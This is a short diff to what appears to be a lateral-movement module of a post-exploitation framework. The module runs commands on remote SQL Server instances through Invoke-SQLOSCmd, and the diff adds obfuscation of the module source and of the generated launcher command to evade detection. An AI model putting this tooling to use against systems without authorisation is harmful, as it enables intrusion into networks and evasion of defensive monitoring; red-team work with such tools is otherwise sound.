@@ -74,7 +74,7 @@ class Module:
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         credID = self.options["CredID"]['Value']
         if credID != "":
@@ -101,6 +101,9 @@ class Module:
 
         moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
         moduleCode = ""
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             with open(moduleSource, 'r') as source:
                 moduleCode = source.read()
@@ -122,10 +125,13 @@ class Module:
                     command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
 
-        script += "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
+        scriptEnd = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
 
         if username != "":
-            script += " -UserName "+username
+            scriptEnd += " -UserName "+username
         if password != "":
-            script += " -Password "+password
+            scriptEnd += " -Password "+password
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
